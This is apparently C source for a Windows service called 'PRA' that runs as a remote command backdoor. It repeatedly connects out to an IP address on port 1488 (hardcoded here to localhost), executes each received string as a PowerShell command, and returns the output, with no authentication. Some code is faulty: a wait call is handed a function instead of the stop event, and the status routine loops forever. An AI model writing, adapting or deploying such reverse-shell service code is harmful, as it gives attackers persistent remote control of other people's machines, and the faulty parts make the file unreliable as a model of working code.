#ifndef UNICODE
#define UNICODE
#endif 

#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <string.h>
#include <io.h>
#include <fcntl.h>
#include <windows.h>
#include "commandservice.h"

#define MAX_SIZE 10000000
#define SERVICE_NAME L"PRA"

void service_main(DWORD dwArgc, LPTSTR *lpszArgv);
void report_svc_status(DWORD current_state, DWORD exit_code, DWORD wait_hint);
void svc_handler(DWORD ctrl);
void svc_init();
void start_life_cycle(const CHAR *ip);

SERVICE_STATUS service_status; 
SERVICE_STATUS_HANDLE service_status_handler;
HANDLE svc_stop_event = NULL;

int main()
{
    SERVICE_TABLE_ENTRY service_table[] = {{SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION) service_main}};
    StartServiceCtrlDispatcher(service_table); 
    return 0;
}

void start_life_cycle(const CHAR *ip)
{
    WSADATA ws;
    WSAStartup(MAKEWORD(2, 2), &ws);

    SOCKET soc = socket(AF_INET, SOCK_STREAM, 0);

    SOCKADDR_IN sai;
    memset(&sai, 0, sizeof(sai));
    sai.sin_family = AF_INET;
    sai.sin_port = htons(1488);

    sai.sin_addr.S_un.S_addr = inet_addr(ip);
    
    while ((connect(soc, (const struct sockaddr *) &sai, sizeof(sai))) != 0) Sleep(10000);

    WCHAR *dataw = (wchar_t *) malloc(MAX_SIZE);
    UCHAR *datac = (unsigned char *) malloc(MAX_SIZE);
    INT written_bytes = 0;

    memset(dataw, 0, MAX_SIZE);
    memset(datac, 0, MAX_SIZE);

    INT reciered;
    INT sended;
    while ((reciered = recv(soc, datac, MAX_SIZE, 0)) > 0)
    {     

        if (!strcmp("bye\n", (const char *) datac))
        {
            closesocket(soc);
            free(datac);
            free(dataw);
            return;
        }

        INT nibites = MultiByteToWideChar(CP_UTF8, 0, datac, -1, NULL, 0);
            INT iconverted = MultiByteToWideChar(
                CP_UTF8, 0, datac, -1, dataw, nibites);
        to_powershell_command(dataw);
        execute_powershell_command(dataw, datac, &written_bytes);
        Sleep(1000);
        sended = send(soc, datac, written_bytes, 0);
    } 
    return;
}

void service_main(DWORD dwArgc, LPTSTR *lpszArgv)
{
    service_status_handler = RegisterServiceCtrlHandler(SERVICE_NAME, (LPHANDLER_FUNCTION) svc_handler);
    if (service_status_handler == 0) return; 

    service_status.dwServiceType = SERVICE_WIN32_OWN_PROCESS; 
    service_status.dwServiceSpecificExitCode = 0; 

    report_svc_status(SERVICE_START_PENDING, NO_ERROR, 3000);
    
    svc_init();
    return; 
}

void svc_handler(DWORD ctrl)
{
    switch(ctrl) 
   {  
        case SERVICE_CONTROL_STOP: 
            report_svc_status(SERVICE_STOP_PENDING, NO_ERROR, 0);
            SetEvent(svc_stop_event);
            report_svc_status(service_status.dwCurrentState, NO_ERROR, 0);
         
        return;
 
        case SERVICE_CONTROL_INTERROGATE: 
            break; 
 
        default: 
            break;
    } 
    return;
}

void report_svc_status(DWORD current_state, DWORD exit_code, DWORD wait_hint)
{
    static DWORD check_point = 1;

    service_status.dwCurrentState = current_state;
    service_status.dwWin32ExitCode = exit_code;
    service_status.dwWaitHint = wait_hint;

    if (current_state == SERVICE_START_PENDING)
    {
        service_status.dwControlsAccepted = 0;
        SetServiceStatus(service_status_handler, &service_status);
        return;
    }
    service_status.dwControlsAccepted = SERVICE_ACCEPT_STOP;

    if (current_state == SERVICE_RUNNING)
    {
        service_status.dwCheckPoint = 0;
        SetServiceStatus(service_status_handler, &service_status);
        while (1) start_life_cycle("127.0.0.1");
        return;
    }
    if (current_state == SERVICE_STOPPED)
    {
        service_status.dwCheckPoint = 0;
        SetServiceStatus(service_status_handler, &service_status);
        return;
    }

    service_status.dwCheckPoint = check_point++;

    SetServiceStatus(service_status_handler, &service_status);
    return;
}

void svc_init()
{
    svc_stop_event = CreateEvent(NULL, TRUE, FALSE, NULL);

    if (svc_stop_event == NULL)
    {
        report_svc_status(SERVICE_STOPPED, GetLastError(), 0);
        return;
    }

    report_svc_status(SERVICE_RUNNING, NO_ERROR, 0);

    WaitForSingleObject(report_svc_status, INFINITE);
    report_svc_status(SERVICE_STOPPED, NO_ERROR, 0);
    return;
}